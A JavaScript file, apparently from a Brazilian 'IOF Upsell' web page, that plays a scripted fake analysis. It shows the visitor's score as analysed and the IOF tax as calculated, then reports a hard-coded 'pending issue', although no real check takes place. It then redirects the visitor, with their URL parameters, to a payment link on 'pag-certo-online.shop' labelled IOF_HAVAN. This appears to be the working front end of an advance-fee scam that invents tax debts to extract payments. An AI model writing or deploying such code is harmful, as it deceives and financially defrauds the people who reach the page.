// Loading sequence controller for IOF Upsell
document.addEventListener('DOMContentLoaded', function() {
    startLoadingSequence();
});

function startLoadingSequence() {
    // Step 1: Consulta de Score
    setTimeout(() => {
        processStep(1, 'Score Analisado ✓', 2000);
    }, 500);
    
    // Step 2: Cálculo de Tributos
    setTimeout(() => {
        processStep(2, 'IOF Calculado ✓', 2500);
    }, 3000);
    
    // Step 3: Status de Liberação
    setTimeout(() => {
        processStep(3, 'Pendência Encontrada!', 1500);
    }, 6000);
    
    // Show upsell screen
    setTimeout(() => {
        showUpsellScreen();
    }, 8500);
}

function processStep(stepNumber, processingText, duration) {
    const step = document.getElementById(`step${stepNumber}`);
    const status = document.getElementById(`status${stepNumber}`);
    const loader = document.getElementById(`loader${stepNumber}`);
    
    if (!step) return;

    // Activate step
    step.classList.add('active');
    status.textContent = 'Processando...';
    if (loader) loader.style.display = 'block';
    
    // Complete step after duration
    setTimeout(() => {
        step.classList.remove('active');
        step.classList.add('completed');
        status.textContent = processingText;
        if (loader) loader.style.display = 'none';
        
        if (stepNumber === 3) {
            step.style.background = 'rgba(231, 76, 60, 0.3)'; // Red for warning
        } else {
            playSuccessSound();
        }
    }, duration);
}

function playSuccessSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
    } catch (e) {}
}

function showUpsellScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const upsellScreen = document.getElementById('upsellScreen');
    
    loadingScreen.style.transition = 'opacity 0.5s ease';
    loadingScreen.style.opacity = '0';
    
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        upsellScreen.style.display = 'block';
        upsellScreen.style.opacity = '0';
        upsellScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            upsellScreen.style.opacity = '1';
        }, 50);
        
        const content = document.querySelector('.upsell-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
    }, 500);
}

function redirectToPayment() {
    const btn = event.currentTarget;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    btn.disabled = true;
    
    // Link de pagamento para o IOF (Exemplo, deve ser substituído pelo real se necessário)
    const paymentUrl = 'https://pay.pag-certo-online.shop/IOF_HAVAN'; 
    const urlParams = new URLSearchParams(window.location.search);
    const finalUrl = paymentUrl + (paymentUrl.includes('?') ? '&' : '?') + urlParams.toString();
    
    setTimeout(() => {
        window.location.href = finalUrl;
    }, 1500);
}
